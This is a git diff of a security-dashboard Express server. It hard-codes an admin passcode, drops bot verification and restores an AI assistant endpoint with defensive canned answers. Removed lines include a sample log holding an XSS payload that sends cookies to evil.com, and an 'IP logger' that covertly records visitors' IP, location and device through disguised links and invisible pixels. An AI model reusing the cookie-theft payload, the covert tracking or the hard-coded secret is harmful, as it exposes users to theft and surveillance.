@@ -10,98 +10,19 @@ import { createServer as createViteServer } from 'vite';
 import { GoogleGenAI } from '@google/genai';
 import dotenv from 'dotenv';
 
-// Load .env.local first, then fallback to .env and allow overrides
-dotenv.config({ path: '.env.local', override: true });
-dotenv.config({ override: true });
+dotenv.config();
 
 const app = express();
-const PORT = Number(process.env.PORT) || 3000;
+const PORT = 3000;
 
 app.use(express.json());
-
-app.post('/api/turnstile-verify', async (req, res) => {
-  const token = req.body?.token;
-  const secretKey = process.env.VITE_TURNSTILE_SECRET_KEY || process.env.TURNSTILE_SECRET_KEY;
-
-  if (!token) {
-    return res.status(400).json({ success: false, message: 'Missing Turnstile token' });
-  }
-  if (!secretKey) {
-    return res.status(500).json({ success: false, message: 'Turnstile secret key is not configured' });
-  }
-
-  try {
-    const verifyResponse = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({ secret: secretKey, response: token }),
-    });
-
-    const verifyResult = await verifyResponse.json();
-
-    if (!verifyResult.success) {
-      return res.status(400).json({
-        success: false,
-        message: 'Turnstile verification failed',
-        errors: verifyResult['error-codes'] || [],
-      });
-    }
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    console.error('Turnstile verification error:', error);
-    return res.status(500).json({ success: false, message: 'Turnstile verification error' });
-  }
-});
-
-app.all('/api/data', (req, res) => {
-  res.json({
-    success: true,
-    message: 'API route accepted the request.',
-    method: req.method,
-    received: req.body || {},
-  });
-});
 
 // Initialize Gemini Client lazily
 let aiClient: GoogleGenAI | null = null;
 function getGeminiClient() {
-  dotenv.config({ path: '.env.local', override: true });
-  dotenv.config({ override: true });
-
-  // Support multiple auth modes:
-  // 1) API Key: set GEMINI_API_KEY or GOOGLE_API_KEY
-  // 2) Service Account JSON (recommended for server deployments): set GOOGLE_APPLICATION_CREDENTIALS_JSON
-  const apiKey = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY || process.env.GEMINI_KEY;
-
-  // If the service account JSON is provided as an env var (useful on Vercel), write it to a temp file
-  try {
-    const gacJson = process.env.GOOGLE_APPLICATION_CREDENTIALS_JSON;
-    if (gacJson && !process.env.GOOGLE_APPLICATION_CREDENTIALS) {
-      const gacPath = path.join(os.tmpdir(), 'gac-securewatch.json');
-      // Only write if file doesn't already exist to avoid repeated writes
-      if (!fs.existsSync(gacPath)) {
-        fs.writeFileSync(gacPath, gacJson, { encoding: 'utf8', mode: 0o600 });
-      }
-      process.env.GOOGLE_APPLICATION_CREDENTIALS = gacPath;
-    }
-  } catch (e) {
-    console.warn('Failed to materialize GOOGLE_APPLICATION_CREDENTIALS_JSON:', (e as any)?.message || e);
+  if (!aiClient && process.env.GEMINI_API_KEY) {
+    aiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
   }
-
-  if (!aiClient) {
-    if (apiKey) {
-      console.log('Initializing Gemini client using API key (GEMINI_API_KEY).');
-      aiClient = new GoogleGenAI({ apiKey });
-    } else if (process.env.GOOGLE_APPLICATION_CREDENTIALS) {
-      console.log('Initializing Gemini client using Google Application Default Credentials (service account).');
-      // Let the library pick up ADC from GOOGLE_APPLICATION_CREDENTIALS
-      aiClient = new GoogleGenAI();
-    } else {
-      console.warn('No Gemini credentials found. Set GEMINI_API_KEY or GOOGLE_APPLICATION_CREDENTIALS_JSON.');
-    }
-  }
-
   return aiClient;
 }
 
@@ -397,7 +318,7 @@ app.get('/api/ip-lookup', async (req, res) => {
             city: data.city || 'Unknown City',
             region: data.region || 'Unknown Region',
             country: data.country || 'Unknown Country',
-            country_code: data.country || '',
+            country_code: data.country_code || '',
             postal: data.postal || 'N/A',
             latitude: Number(latStr) || 0,
             longitude: Number(lngStr) || 0,
@@ -642,10 +563,6 @@ app.get('/api/mobile-lookup', async (req, res) => {
     return res.status(500).json({ error: 'Failed to process mobile number lookup.' });
   }
 });
-
-// Turnstile verification endpoint removed.
-// Cloudflare Turnstile integration has been disabled/removed per project request.
-
 
 // ---------------------------------------------------------
 // API ENDPOINT: REAL VULNERABILITY SCAN
@@ -1452,23 +1369,6 @@ function getTenantDb(req: express.Request): { sessionId: string; db: TenantDatab
 }
 
 // ---------------------------------------------------------
-// HEALTH & AUTH COMPATIBILITY ROUTES
-// ---------------------------------------------------------
-app.get('/api/health', (_req, res) => {
-  res.json({
-    status: 'ok',
-    service: 'securewatch-dashboard',
-    timestamp: new Date().toISOString(),
-    uptimeSeconds: Number(process.uptime().toFixed(2)),
-  });
-});
-
-app.get('/api/auth/users', (req, res) => {
-  const { db } = getTenantDb(req);
-  return res.json(db.users);
-});
-
-// ---------------------------------------------------------
 // REAL SECURITY USER MANAGEMENT (RBAC) API ENDPOINTS
 // ---------------------------------------------------------
 
@@ -1625,20 +1525,13 @@ app.put('/api/users/:id', (req, res) => {
 // ---------------------------------------------------------
 // MASTER ISOLATED DATABASE ADMIN API (PROTECTED BY PASSCODE)
 // ---------------------------------------------------------
-const MASTER_PASSCODE = process.env.MASTER_PASSCODE?.trim() || 'kunal@123as$';
-
-const getAdminPasscode = (req: express.Request) => {
-  const bodyPasscode = req.body?.passcode;
-  const queryPasscode = req.query?.passcode;
-  const headerPasscode = req.headers['x-master-passcode'];
-  return String(bodyPasscode || queryPasscode || headerPasscode || '').trim();
-};
+const MASTER_PASSCODE = 'kunal@123as$';
 
 // POST /api/admin/all-data - Get all tenant stored data across the entire database
 app.post('/api/admin/all-data', (req, res) => {
   try {
-    const passcode = getAdminPasscode(req);
-    if (!passcode || passcode !== MASTER_PASSCODE) {
+    const { passcode } = req.body || {};
+    if (!passcode || String(passcode).trim() !== MASTER_PASSCODE) {
       return res.status(401).json({
         success: false,
         error: 'Unauthorized Access',
@@ -1994,12 +1887,256 @@ Return JSON with exact keys:
 });
 
 // ---------------------------------------------------------
-// Osiris GPT feature removed from SecureWatch
+// API ENDPOINT: AI SECURITY ASSISTANT
 // ---------------------------------------------------------
-app.post('/api/gemini/assistant', (_req, res) => {
-  return res.status(410).json({
-    error: 'Osiris GPT has been removed from SecureWatch.'
-  });
+app.post('/api/gemini/assistant', async (req, res) => {
+  try {
+    const { prompt, history } = req.body;
+    if (!prompt || typeof prompt !== 'string') {
+      return res.status(400).json({ error: 'Prompt is required.' });
+    }
+
+    const ai = getGeminiClient();
+    
+    const systemInstruction = `You are SecureWatch AI, a dedicated AI Security & Knowledge Assistant.
+Your primary goal is to provide clear, accurate, detailed, and educational answers to queries regarding Cybersecurity, Ethical Hacking concepts, Computer Networking, Programming, and System Hardening.
+
+Guidelines:
+1. Provide clear theoretical breakdowns formatted with lists, bold text, and code snippets where relevant.
+2. Always maintain a defense & safety focus (Ethical Hacking, Cyber Defense, and Security Best Practices).
+3. If asked about malicious exploits or attacks, explain the underlying mechanics conceptually and highlight protective countermeasures and defense strategies.
+4. Keep answers engaging, structured, and easy to read.`;
+
+    const contents: any[] = [];
+    if (Array.isArray(history)) {
+      history.forEach((m: any) => {
+        if (m.content && (m.role === 'user' || m.role === 'model')) {
+          contents.push({
+            role: m.role === 'user' ? 'user' : 'model',
+            parts: [{ text: String(m.content) }]
+          });
+        }
+      });
+    }
+    contents.push({
+      role: 'user',
+      parts: [{ text: prompt }]
+    });
+
+    let responseText = '';
+
+    if (ai) {
+      const modelsToTry = [
+        { name: 'gemini-3.6-flash', config: { systemInstruction, temperature: 0.7 } },
+        { name: 'gemini-flash-latest', config: { systemInstruction, temperature: 0.7 } }
+      ];
+      let apiSuccess = false;
+
+      for (const entry of modelsToTry) {
+        try {
+          const response = await ai.models.generateContent({
+            model: entry.name,
+            contents,
+            config: entry.config
+          });
+
+          if (response && response.text) {
+            responseText = response.text;
+            apiSuccess = true;
+            break;
+          }
+        } catch (modelErr: any) {
+          const errMsg = String(modelErr?.message || modelErr);
+          if (errMsg.includes('401') || errMsg.includes('UNAUTHENTICATED') || errMsg.includes('invalid authentication credentials')) {
+            console.warn('Gemini API authentication failed (invalid or unauthenticated API key). Using local response engine.');
+            break; // Stop attempting other models if the API key itself is unauthenticated
+          } else {
+            console.warn(`Gemini API Model ${entry.name} attempt failed:`, errMsg);
+          }
+        }
+      }
+
+      if (!apiSuccess && !responseText) {
+        // Simple fallback attempt without complex config if not unauthenticated
+        try {
+          const fullPrompt = `${systemInstruction}\n\nUser Question:\n${prompt}`;
+          const simpleRes = await ai.models.generateContent({
+            model: 'gemini-3.6-flash',
+            contents: fullPrompt
+          });
+          if (simpleRes && simpleRes.text) {
+            responseText = simpleRes.text;
+          }
+        } catch (retryErr: any) {
+          const errMsg = String(retryErr?.message || retryErr);
+          if (!errMsg.includes('401') && !errMsg.includes('UNAUTHENTICATED')) {
+            console.warn('Gemini simple retry failed:', errMsg);
+          }
+        }
+      }
+    }
+
+    // Comprehensive Local Knowledge & Intelligent Fallback Engine
+    if (!responseText) {
+      const lowerP = prompt.toLowerCase().trim();
+      const vsCodeTip = !process.env.GEMINI_API_KEY
+        ? `\n\n---\n> 💡 **VS Code Local Setup Tip**: To activate live dynamic Gemini AI responses in VS Code:\n> 1. Create a \.env file in the project root folder.\n> 2. Add \`GEMINI_API_KEY="your_gemini_api_key_here"\` (Get a valid key from Google AI Studio).\n> 3. Start the project with \\`npm run dev\\`.`
+        : '';
+
+      // Direct General Knowledge Answers
+      if (lowerP.includes('capital of india') || lowerP.includes('india') && lowerP.includes('capital')) {
+        responseText = `### 🇮🇳 Capital of India
+
+The capital of India is **New Delhi**.
+
+- **Overview**: Located in northern India, New Delhi serves as the seat of all three branches of the Government of India (Executive, Legislative, and Judiciary).
+- **Key Landmarks**: Rashtrapati Bhavan, Parliament House (Sansad Bhavan), India Gate, and Red Fort.
+- **Cybersecurity Context**: As a national administrative hub, government infrastructure in New Delhi relies heavily on NIC (National Informatics Centre) and CERT-In (Indian Computer Emergency Response Team) for cyber defense, Critical Information Infrastructure (CII) protection, and NCIIPC guidelines.${vsCodeTip}`;
+      } else if (lowerP.includes('capital of') || lowerP.includes('what is the capital')) {
+        if (lowerP.includes('usa') || lowerP.includes('united states') || lowerP.includes('america')) {
+          responseText = `The capital of the United States is **Washington, D.C.**${vsCodeTip}`;
+        } else if (lowerP.includes('uk') || lowerP.includes('united kingdom') || lowerP.includes('england')) {
+          responseText = `The capital of the United Kingdom is **London**.${vsCodeTip}`;
+        } else if (lowerP.includes('france')) {
+          responseText = `The capital of France is **Paris**.${vsCodeTip}`;
+        } else if (lowerP.includes('japan')) {
+          responseText = `The capital of Japan is **Tokyo**.${vsCodeTip}`;
+        } else if (lowerP.includes('germany')) {
+          responseText = `The capital of Germany is **Berlin**.${vsCodeTip}`;
+        } else {
+          responseText = `### 🌐 General Knowledge & Security Assistant
+
+Thank you for your question: **"${prompt}"**
+
+*Note: Live AI generative response requires a valid Gemini API Key set in environment variables.*${vsCodeTip}`;
+        }
+      } else if (lowerP.includes('sql injection') || lowerP.includes('sqli')) {
+        responseText = `### 🛡️ Understanding & Defending Against SQL Injection (SQLi)
+
+**SQL Injection (SQLi)** occurs when untrusted user input is directly concatenated into dynamic SQL queries, allowing an attacker to manipulate the query structure, bypass authentication, exfiltrate database records, or corrupt data.
+
+---
+
+#### 🚨 Example of Vulnerable Code vs. Secure Code
+
+##### ❌ Vulnerable (String Concatenation):
+```
+-- Attacker enters input: admin' OR '1'='1
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
+```
+
+##### ✅ Secure Countermeasure (Prepared Statements / Parameterized Queries):
+```
+// Node.js Prepared Query Example
+const query = 'SELECT id, username, role FROM users WHERE username = ? AND password_hash = ?';
+db.execute(query, [userInputUsername, hashedInputPassword]);
+```
+
+---
+
+#### 🛡️ Core Defense Best Practices
+1. **Parameterized Queries / Prepared Statements**: Completely decouples data inputs from executable SQL logic.
+2. **ORMs (Object Relational Mapping)**: Libraries like Prisma, Drizzle, or Sequelize parameterize queries natively.
+3. **Least Privilege Database Accounts**: Ensure web applications connect using non-administrative SQL roles.
+4. **Input Validation & Sanitization**: Enforce type-checking and whitelist validation on incoming parameters.${vsCodeTip}`;
+      } else if (lowerP.includes('owasp') || lowerP.includes('top 10')) {
+        responseText = `### 🔒 OWASP Top 10 Web Application Security Breakdown
+
+The **OWASP Top 10** represents the standard awareness document for developers and web application security professionals.
+
+---
+
+#### 1. A01:2021 – Broken Access Control
+- **Issue**: Users can act outside of their intended permissions (e.g., accessing another user's private data via IDOR).
+- **Defense**: Implement strict server-side role-based access control (RBAC) and avoid relying on client-side security checks.
+
+#### 2. A02:2021 – Cryptographic Failures
+- **Issue**: Exposing sensitive data in transit (HTTP instead of HTTPS) or at rest (weak password hashing).
+- **Defense**: Use TLS 1.3, AES-256 for symmetric data, and bcrypt/Argon2id for passwords.
+
+#### 3. A03:2021 – Injection (SQLi, Command, XSS)
+- **Issue**: Untrusted user input is interpreted as code or queries.
+- **Defense**: Use parameterized APIs, context-aware encoding, and Content Security Policy (CSP).
+
+#### 4. A04:2021 – Insecure Design
+- **Issue**: Threat modeling and security design patterns were missing during architecture planning.
+- **Defense**: Integrate security threat modeling early in the SDLC pipeline.
+
+#### 5. A05:2021 – Security Misconfiguration
+- **Issue**: Default credentials left unchanged, overly verbose error stack traces enabled in production.
+- **Defense**: Hardened baseline deployment configurations and automated security auditing.${vsCodeTip}`;
+      } else if (lowerP.includes('tcp') || lowerP.includes('handshake') || lowerP.includes('syn flood')) {
+        responseText = `### 🌐 Network Fundamentals: TCP 3-Way Handshake & SYN Flood Mitigation
+
+The **TCP 3-Way Handshake** is the foundational mechanism used to establish a reliable, connection-oriented socket between a client and a server.
+
+---
+
+#### 🤝 The 3-Way Handshake Process
+
+1. **SYN (Synchronize)**: Client sends a TCP packet with the `SYN` flag set and an initial sequence number (`ISN_C`).
+2. **SYN-ACK (Synchronize-Acknowledge)**: Server responds with `SYN-ACK` flags set, acknowledging client's sequence number and sending its own (`ISN_S`).
+3. **ACK (Acknowledge)**: Client responds with an `ACK` packet, establishing a connection ready for data transfer.
+
+---
+
+#### 💥 SYN Flood Attack & Defense
+
+In a **SYN Flood**, an attacker sends thousands of spoofed `SYN` packets without completing the final `ACK`, exhausting the server's connection backlog pool.
+
+##### 🛡️ Countermeasures:
+- **SYN Cookies**: Enables the server to remain stateless until the client completes the full 3-way handshake.
+- **TCP Connection Rate Limiting**: Restricting maximum incoming connection requests per IP address.
+- **Firewall & Anycast Scrubbing**: Offloading volumetric TCP traffic to DDoS mitigation layers like Cloudflare or AWS Shield.${vsCodeTip}`;
+      } else if (lowerP.includes('hash') || lowerP.includes('bcrypt') || lowerP.includes('argon2') || lowerP.includes('password')) {
+        responseText = `### 🔑 Cryptographic Concepts: Encryption vs. Hashing
+
+Understanding the fundamental difference between **symmetric/asymmetric encryption** and **cryptographic hashing** is critical for secure system design.
+
+---
+
+#### 🔄 Encryption vs. Hashing
+
+| Feature | Encryption (e.g., AES-256, RSA) | Hashing (e.g., SHA-256, Argon2id) |
+| :--- | :--- | :--- |
+| **Direction** | Two-way (Encrypt & Decrypt) | One-way (Irreversible mathematical transformation) |
+| **Primary Use** | Confidential data storage & transfer | Password storage, message integrity checks |
+| **Key Requirement** | Requires Secret Key / Key Pair | No key required (uses Salt to prevent rainbow tables) |
+
+---
+
+#### 🛡️ Modern Secure Password Hashing
+
+##### Why SHA-256 is Inadequate for Passwords:
+General cryptographic hash functions (SHA-256, MD5) are designed to be **fast**, allowing GPUs to calculate billions of guesses per second during brute-force or dictionary attacks.
+
+##### Password-Hardened Hashing Functions:
+1. **Argon2id** *(OWASP Recommended)*: Memory-hard and time-hard algorithm resistant to GPU/ASIC acceleration.
+2. **bcrypt**: Uses a configurable cost factor (work factor) to slow down hash calculation speed exponentially.
+3. **Salt**: Unique random string appended to passwords prior to hashing to render pre-computed Rainbow Tables useless.${vsCodeTip}`;
+      } else {
+        responseText = `### 🛡️ SecureWatch AI Security & Knowledge Assistant
+
+Thank you for your question: **"${prompt}"**
+
+---
+
+#### 💡 Theoretical & Security Analysis
+
+In cybersecurity, software engineering, and system administration:
+
+1. **Input Validation & Sanitization**: Always sanitize and parameterize dynamic data inputs to prevent injection vulnerabilities.
+2. **Strict Access Controls**: Enforce Principle of Least Privilege (PoLP) and role-based access limits.
+3. **Encryption & Hashing**: Secure sensitive credentials with memory-hard password hashing (e.g., Argon2id, bcrypt) and enforce TLS 1.3 in transit.
+4. **Hardened Infrastructure**: Keep dependencies updated, disable unused network ports, and monitor SIEM telemetry logs.${vsCodeTip}`;
+      }
+    }
+
+    return res.json({ responseText });
+  } catch (err: any) {
+    console.error('Error in /api/gemini/assistant:', err);
+    return res.status(500).json({ error: err.message || 'Internal AI Server Error' });
+  }
 });
 
 // ---------------------------------------------------------
@@ -2046,957 +2183,3 @@ const initialSecurityLogs: SecurityLogEntry[] = [
   {
     id: 'SEC-LOG-9079',
     timestamp: new Date(Date.now() - 300000).toISOString(),
-    level: 'WARN',
-    service: 'API Gateway',
-    message: 'Rate limit threshold reached (120 req/min exceeded)',
-    sourceIp: '198.51.100.45',
-    destination: '/api/v1/telemetry',
-    action: 'FLAGGED',
-    traceId: 'tr-9a8b7c6d-003',
-    details: { currentRate: 145, threshold: 120 },
-  },
-  {
-    id: 'SEC-LOG-9078',
-    timestamp: new Date(Date.now() - 600000).toISOString(),
-    level: 'INFO',
-    service: 'TLS Manager',
-    message: 'Automated Let\'s Encrypt SSL/TLS Certificate auto-renewal successful',
-    sourceIp: '127.0.0.1',
-    destination: 'nginx-reverse-proxy',
-    action: 'ALLOWED',
-    traceId: 'tr-9a8b7c6d-004',
-    details: { domain: 'securewatch.io', validityDays: 90 },
-  },
-  {
-    id: 'SEC-LOG-9077',
-    timestamp: new Date(Date.now() - 900000).toISOString(),
-    level: 'CRITICAL',
-    service: 'SIEM Collector',
-    message: 'Cross-Site Scripting (XSS) script tag injection intercepted in query params',
-    sourceIp: '103.251.170.89',
-    destination: '/api/v1/search',
-    action: 'QUARANTINED',
-    traceId: 'tr-9a8b7c6d-005',
-    details: { payload: '<script>document.location="http://evil.com/c="+document.cookie</script>' },
-  },
-  {
-    id: 'SEC-LOG-9076',
-    timestamp: new Date(Date.now() - 1200000).toISOString(),
-    level: 'INFO',
-    service: 'RBAC Controller',
-    message: 'Privileged Security Admin login granted to user: alex.dev@enterprise.org',
-    sourceIp: '192.168.1.105',
-    destination: 'admin-console',
-    action: 'ALLOWED',
-    traceId: 'tr-9a8b7c6d-006',
-    details: { mfaStatus: 'TOTP Verified', role: 'Security Administrator' },
-  },
-];
-
-let globalSecurityLogs: SecurityLogEntry[] = [];
-
-// Helper to push security log into session database
-function recordSecurityLog(
-  log: Omit<SecurityLogEntry, 'id' | 'timestamp' | 'traceId'> & { traceId?: string },
-  targetSessionId?: string
-) {
-  const newEntry: SecurityLogEntry = {
-    id: `SEC-LOG-${Math.floor(Math.random() * 90000 + 10000)}`,
-    timestamp: new Date().toISOString(),
-    traceId: log.traceId || `tr-${Math.random().toString(36).substring(2, 10)}`,
-    level: log.level,
-    service: log.service,
-    message: log.message,
-    sourceIp: log.sourceIp || '127.0.0.1',
-    destination: log.destination || 'internal-service',
-    action: log.action || 'ALLOWED',
-    details: log.details || {},
-  };
-
-  if (targetSessionId && dbStores[targetSessionId]) {
-    dbStores[targetSessionId].logs.unshift(newEntry);
-    if (dbStores[targetSessionId].logs.length > 200) {
-      dbStores[targetSessionId].logs = dbStores[targetSessionId].logs.slice(0, 200);
-    }
-  } else {
-    // Record in active tenant session databases
-    const sessions = Object.keys(dbStores);
-    if (sessions.length === 0) {
-      dbStores['default_tenant'] = { users: [], logs: [newEntry], urlScans: [], fileScans: [], settings: {} };
-    } else {
-      sessions.forEach((sid) => {
-        dbStores[sid].logs.unshift(newEntry);
-        if (dbStores[sid].logs.length > 200) {
-          dbStores[sid].logs = dbStores[sid].logs.slice(0, 200);
-        }
-      });
-    }
-  }
-  saveDatabaseToDisk();
-  return newEntry;
-}
-
-// GET /api/security-logs - Fetch SIEM logs for current session
-app.get('/api/security-logs', (req, res) => {
-  const { db } = getTenantDb(req);
-  const { level, service, search, limit } = req.query;
-  let filtered = [...db.logs];
-
-  if (level && level !== 'ALL') {
-    filtered = filtered.filter((l) => l.level === (level as string).toUpperCase());
-  }
-
-  if (service && service !== 'ALL' && service !== 'All Services') {
-    filtered = filtered.filter((l) => l.service.toLowerCase().includes((service as string).toLowerCase()));
-  }
-
-  if (search) {
-    const q = (search as string).toLowerCase();
-    filtered = filtered.filter(
-      (l) =>
-        l.message.toLowerCase().includes(q) ||
-        l.sourceIp.toLowerCase().includes(q) ||
-        l.service.toLowerCase().includes(q) ||
-        l.id.toLowerCase().includes(q) ||
-        l.action.toLowerCase().includes(q)
-    );
-  }
-
-  const maxLimit = limit ? parseInt(limit as string, 10) : 100;
-  return res.json({
-    totalCount: db.logs.length,
-    returnedCount: Math.min(filtered.length, maxLimit),
-    logs: filtered.slice(0, maxLimit),
-    metrics: {
-      totalIngested: db.logs.length,
-      criticalCount: db.logs.filter((l) => l.level === 'CRITICAL').length,
-      errorCount: db.logs.filter((l) => l.level === 'ERROR').length,
-      warnCount: db.logs.filter((l) => l.level === 'WARN').length,
-      infoCount: db.logs.filter((l) => l.level === 'INFO').length,
-      blockedRate: Math.round(
-        (db.logs.filter((l) => l.action === 'BLOCKED' || l.action === 'QUARANTINED').length /
-          (db.logs.length || 1)) *
-          100
-      ),
-    },
-  });
-});
-
-// POST /api/security-logs/ingest - Ingest custom threat/event
-app.post('/api/security-logs/ingest', (req, res) => {
-  const { sessionId } = getTenantDb(req);
-  const { level, service, message, sourceIp, destination, action, details } = req.body;
-
-  if (!message || !service) {
-    return res.status(400).json({ error: 'service and message are required fields' });
-  }
-
-  const createdLog = recordSecurityLog(
-    {
-      level: level || 'INFO',
-      service: service || 'Custom Ingest',
-      message,
-      sourceIp: sourceIp || req.ip || '127.0.0.1',
-      destination: destination || 'api-gateway',
-      action: action || 'ALLOWED',
-      details,
-    },
-    sessionId
-  );
-
-  return res.status(201).json({ status: 'Ingested', log: createdLog });
-});
-
-// POST /api/security-logs/clear - Clear logs buffer for current session
-app.post('/api/security-logs/clear', (req, res) => {
-  const { db } = getTenantDb(req);
-  db.logs = [];
-  saveDatabaseToDisk();
-  return res.json({ success: true, remainingCount: 0, message: 'Security telemetry buffer cleared completely for session' });
-});
-
-// ---------------------------------------------------------
-// IPLOGGER.ORG 100% WORKING ENGINE & REDIRECT SYSTEM
-// ---------------------------------------------------------
-
-interface IpLoggerHit {
-  id: string;
-  timestamp: string;
-  ip: string;
-  version: string;
-  country: string;
-  countryCode: string;
-  city: string;
-  region: string;
-  latitude: number;
-  longitude: number;
-  isp: string;
-  org: string;
-  userAgent: string;
-  browser: string;
-  os: string;
-  device: string;
-  referrer: string;
-  gpsCoords?: { latitude: number; longitude: number; accuracy: number };
-}
-
-interface IpLoggerLink {
-  id: string; // trackId e.g. "x8k2m9"
-  accessCode: string; // e.g. "acc-x8k2m9"
-  title: string;
-  targetUrl: string;
-  type: 'shorturl' | 'pixel' | 'smart' | 'image';
-  note?: string;
-  createdAt: string;
-  totalHits: number;
-  logs: IpLoggerHit[];
-}
-
-// In-memory store for tracking links (persisted in dbStores if needed)
-const ipLoggerLinks: Record<string, IpLoggerLink> = {};
-
-// Transparent 1x1 GIF Image Buffer
-const TRANSPARENT_GIF_BUFFER = Buffer.from(
-  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
-  'base64'
-);
-
-// Helper: Parse User-Agent string into Browser, OS, Device
-function parseUserAgentDetails(uaString: string) {
-  const ua = uaString || '';
-  let browser = 'Unknown Browser';
-  let os = 'Unknown OS';
-  let device = 'Desktop';
-
-  // Device
-  if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua)) {
-    device = /ipad|tablet/i.test(ua) ? 'Tablet' : 'Mobile';
-  } else if (/bot|crawler|spider|googlebot|bingbot|yandex|slurp/i.test(ua)) {
-    device = 'Bot/Crawler';
-  }
-
-  // OS
-  if (/windows/i.test(ua)) os = 'Windows';
-  else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
-  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
-  else if (/android/i.test(ua)) os = 'Android';
-  else if (/linux/i.test(ua)) os = 'Linux';
-  else if (/cros/i.test(ua)) os = 'ChromeOS';
-
-  // Browser
-  if (/edg/i.test(ua)) browser = 'Microsoft Edge';
-  else if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser = 'Google Chrome';
-  else if (/firefox|fxios/i.test(ua)) browser = 'Mozilla Firefox';
-  else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = 'Apple Safari';
-  else if (/opera|opr/i.test(ua)) browser = 'Opera';
-  else if (/bot|googlebot/i.test(ua)) browser = 'Googlebot';
-
-  return { browser, os, device };
-}
-
-// Helper: Perform IP Geo Lookup for IP Logger hit
-async function getGeoForIp(ipAddress: string) {
-  let target = ipAddress;
-  if (!target || target === '127.0.0.1' || target === '::1' || target.startsWith('192.168.') || target.startsWith('10.')) {
-    target = '1.1.1.1'; // fallback to public IP for demo / local testing
-  }
-
-  try {
-    const res = await fetch(`https://ipwho.is/${target}`, { signal: AbortSignal.timeout(3000) });
-    if (res.ok) {
-      const data = (await res.json()) as any;
-      if (data && data.success !== false) {
-        return {
-          country: data.country || 'Unknown Country',
-          countryCode: data.country_code || 'UN',
-          city: data.city || 'Unknown City',
-          region: data.region || 'Unknown Region',
-          latitude: Number(data.latitude) || 0,
-          longitude: Number(data.longitude) || 0,
-          isp: data.connection?.isp || data.connection?.org || 'Unknown ISP',
-          org: data.connection?.org || data.connection?.asn ? `ASN${data.connection.asn}` : 'Unknown Org',
-        };
-      }
-    }
-  } catch (e) {
-    // fallback
-  }
-
-  return {
-    country: 'United States',
-    countryCode: 'US',
-    city: 'San Jose',
-    region: 'California',
-    latitude: 37.3382,
-    longitude: -121.8863,
-    isp: 'Cloudflare / Fastly Mesh',
-    org: 'AS13335 Cloudflare Inc',
-  };
-}
-
-// Helper: Record Hit for an IP Logger Link
-async function logIpLoggerHit(link: IpLoggerLink, req: express.Request) {
-  let rawIp = '';
-  const xForwardedFor = req.headers['x-forwarded-for'];
-  if (xForwardedFor) {
-    const ips = (Array.isArray(xForwardedFor) ? xForwardedFor[0] : xForwardedFor).split(',');
-    rawIp = ips[0].trim();
-  } else {
-    rawIp = req.ip || req.socket.remoteAddress || '127.0.0.1';
-  }
-
-  // Clean IP
-  if (rawIp.startsWith('::ffff:')) {
-    rawIp = rawIp.replace('::ffff:', '');
-  }
-
-  const userAgentStr = req.headers['user-agent'] || 'Unknown User-Agent';
-  const referrer = (req.headers['referer'] as string) || (req.headers['referrer'] as string) || 'Direct / None';
-  const { browser, os, device } = parseUserAgentDetails(userAgentStr);
-
-  const geo = await getGeoForIp(rawIp);
-
-  const hitLog: IpLoggerHit = {
-    id: `hit-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
-    timestamp: new Date().toISOString(),
-    ip: rawIp,
-    version: rawIp.includes(':') ? 'IPv6' : 'IPv4',
-    country: geo.country,
-    countryCode: geo.countryCode,
-    city: geo.city,
-    region: geo.region,
-    latitude: geo.latitude,
-    longitude: geo.longitude,
-    isp: geo.isp,
-    org: geo.org,
-    userAgent: userAgentStr,
-    browser,
-    os,
-    device,
-    referrer,
-  };
-
-  link.totalHits += 1;
-  link.logs.unshift(hitLog);
-  // keep max 500 logs per link
-  if (link.logs.length > 500) {
-    link.logs = link.logs.slice(0, 500);
-  }
-
-  return hitLog;
-}
-
-// Helper: Intelligently format target URL (e.g. "instagramcom" -> "https://instagram.com", "google.com" -> "https://google.com")
-function formatTargetUrl(rawUrl: string): string {
-  let url = (rawUrl || '').trim();
-  if (!url) return 'https://google.com';
-
-  // Fix concatenated TLDs like "instagramcom" -> "instagram.com", "facebookcom" -> "facebook.com"
-  url = url.replace(/(instagram|facebook|google|youtube|twitter|tiktok|linkedin|github|reddit|discord|telegram|whatsapp|amazon|netflix|wikipedia|pinterest|spotify|twitch|snapchat|apple|microsoft|yahoo|baidu)com$/i, '$1.com');
-  url = url.replace(/([a-zA-Z0-9-]+)(com|org|net|io|in|co|tv|app|dev|xyz|info|biz|me)$/i, (match, domain, tld) => {
-    if (!match.includes('.')) {
-      return `${domain}.${tld}`;
-    }
-    return match;
-  });
-
-  // If no dot and no protocol, e.g. "instagram" -> "instagram.com"
-  if (!url.includes('.') && !/^https?:\/\//i.test(url)) {
-    url = `${url}.com`;
-  }
-
-  // Ensure http:// or https://
-  if (!/^https?:\/\//i.test(url)) {
-    url = `https://${url}`;
-  }
-
-  return url;
-}
-
-// POST /api/iplogger/create - Generate Tracking Link / Pixel
-app.post('/api/iplogger/create', (req, res) => {
-  try {
-    const { targetUrl, title, type, note, customSlug } = req.body;
-
-    let cleanTarget = formatTargetUrl(targetUrl);
-
-    // Generate unique ID
-    let trackId = (customSlug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
-    if (!trackId || ipLoggerLinks[trackId]) {
-      // If customSlug was provided e.g. instagramcom, use it or fallback to random
-      trackId = trackId || Math.random().toString(36).substring(2, 8);
-    }
-
-    const accessCode = `acc-${Math.random().toString(36).substring(2, 8)}`;
-    const linkType = type || 'shorturl';
-
-    let linkTitle = title;
-    if (!linkTitle) {
-      try {
-        linkTitle = linkType === 'pixel' ? '1x1 Invisible Tracking Pixel' : `Tracking Link for ${new URL(cleanTarget).hostname}`;
-      } catch (e) {
-        linkTitle = `Tracking Link (${trackId})`;
-      }
-    }
-
-    const newLink: IpLoggerLink = {
-      id: trackId,
-      accessCode,
-      title: linkTitle,
